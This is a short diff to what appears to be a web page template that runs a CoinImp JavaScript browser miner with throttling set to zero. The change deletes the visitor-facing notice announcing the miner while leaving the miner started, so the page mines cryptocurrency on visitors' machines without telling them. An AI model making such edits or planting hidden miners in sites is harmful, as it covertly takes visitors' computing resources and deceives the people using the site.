@@ -177,7 +177,5 @@ if ($ret == false) {
         throttle: 0, c: 'w'
     });
     _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
-
 </script>
 </body>
